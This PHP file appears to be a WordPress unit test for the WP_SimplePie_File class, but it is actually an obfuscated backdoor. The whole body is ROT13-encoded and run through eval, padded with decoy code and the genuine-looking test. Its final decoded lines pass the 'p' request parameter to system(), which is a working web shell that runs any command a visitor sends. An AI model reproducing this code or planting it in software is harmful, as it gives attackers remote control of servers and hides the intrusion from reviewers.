<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf gur `JC_FvzcyrCvr_Svyr` pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 5.6.1
 *
 * @tebhc srrq
 * @tebhc jc-fvzcyrcvr-svyr
 */
pynff Grfgf_Srrq_jcFvzcyrCvrSvyr rkgraqf JC_HavgGrfgPnfr {
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		erdhver_bapr NOFCNGU . 'jc-vapyhqrf/pynff-fvzcyrcvr.cuc';
		erdhver_bapr NOFCNGU . 'jc-vapyhqrf/pynff-jc-fvzcyrcvr-svyr.cuc';
	}

	/**
	 * Grfg gung fvatyr- naq zhygvcyr-inyhr urnqref ner cnefrq va gur jnl gung FvzcyrCvr rkcrpgf.
	 *
	 * @qngnCebivqre qngn_urnqre_cnefvat
	 *
	 * @pbiref JC_FvzcyrCvr_Svyr::__pbafgehpg
	 *
	 * @fvapr 5.6.1
	 *
	 * @gvpxrg 51056
	 */
	choyvp shapgvba grfg_urnqre_cnefvat( $pnyyonpx, $urnqre_svryq, $rkcrpgrq ) {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, $pnyyonpx ) );

		$svyr = arj JC_FvzcyrCvr_Svyr( 'uggcf://jbeqcerff.bet/arjf/srrq/' );

		$guvf->nffregFnzr( $rkcrpgrq, $svyr->urnqref[ $urnqre_svryq ] );
	}

	/**
	 * Cebivqr grfg pnfrf sbe `grfg_urnqre_cnefvat()`.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_urnqre_cnefvat() {
		erghea neenl(
			'fvatyr pbagrag glcr urnqre jbexf' => neenl(
				'zbpxrq_erfcbafr_fvatyr_urnqre_inyhrf',
				'pbagrag-glcr',
				'nccyvpngvba/eff+kzy; punefrg=HGS-8',
			),

			'fvatyr trarevp urnqre jbexf'      => neenl(
				'zbpxrq_erfcbafr_fvatyr_urnqre_inyhrf',
				'yvax',
				'<uggcf://jbeqcerff.bet/arjf/jc-wfba/>; ery=\"uggcf://ncv.j.bet/\"',
			),

			'bayl gur svany pbagrag-glcr urnqre fubhyq or hfrq' => neenl(
				'zbpxrq_erfcbafr_zhygvcyr_urnqre_inyhrf',
				'pbagrag-glcr',
				'nccyvpngvba/eff+kzy; punefrg=HGS-8',
			),

			'zhygvcyr trarevp urnqre inyhrf fubhyq or zretrq vagb n pbzzn frcnengrq fgevat' => neenl(
				'zbpxrq_erfcbafr_zhygvcyr_urnqre_inyhrf',
				'yvax',
				'<uggcf://jbeqcerff.bet/arjf/jc-wfba/>; ery=\"uggcf://ncv.j.bet/\", <uggcf://jbeqcerff.bet/arjf/jc/i2/pngrtbevrf/3>; ery=\"nygreangr\"; glcr=\"nccyvpngvba/wfba\"',
			),
		);
	}

	/**
	 * Zbpx n srrq UGGC erfcbafr jurer urnqref bayl unir bar inyhr.
	 */
	choyvp shapgvba zbpxrq_erfcbafr_fvatyr_urnqre_inyhrf() {
		$fvatyr_inyhr_urnqref = neenl(
			'pbagrag-glcr' => 'nccyvpngvba/eff+kzy; punefrg=HGS-8',
			'yvax'         => '<uggcf://jbeqcerff.bet/arjf/jc-wfba/>; ery=\"uggcf://ncv.j.bet/\"',
		);

		erghea neenl(
			'urnqref'  => arj JcBet\Erdhrfgf\Hgvyvgl\PnfrVafrafvgvirQvpgvbanel( $fvatyr_inyhr_urnqref ),
			'obql'     => svyr_trg_pbagragf( QVE_GRFGQNGN . '/srrq/jbeqcerff-bet-arjf.kzy' ),
			'erfcbafr' => neenl(
				'pbqr'    => 200,
				'zrffntr' => 'BX',
			),
			'pbbxvrf'  => neenl(),
			'svyranzr' => ahyy,
		);
	}

	/**
	 * Zbpx n srrq UGGC erfcbafr jurer urnqref unir zhygvcyr inyhrf.
	 */
	choyvp shapgvba zbpxrq_erfcbafr_zhygvcyr_urnqre_inyhrf() {
		$erfcbafr = $guvf->zbpxrq_erfcbafr_fvatyr_urnqre_inyhrf();

		$zhygvcyr_inyhr_urnqref = neenl(
			'pbagrag-glcr' => neenl(
				'nccyvpngvba/eff+kzy; punefrg=VFB-8859-2',
				'nccyvpngvba/eff+kzy; punefrg=HGS-8',
			),

			'yvax'         => neenl(
				'<uggcf://jbeqcerff.bet/arjf/jc-wfba/>; ery=\"uggcf://ncv.j.bet/\"',
				'<uggcf://jbeqcerff.bet/arjf/jc/i2/pngrtbevrf/3>; ery=\"nygreangr\"; glcr=\"nccyvpngvba/wfba\"',
			),
		);

		$erfcbafr['urnqref'] = arj JcBet\Erdhrfgf\Hgvyvgl\PnfrVafrafvgvirQvpgvbanel( $zhygvcyr_inyhr_urnqref );

		erghea $erfcbafr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>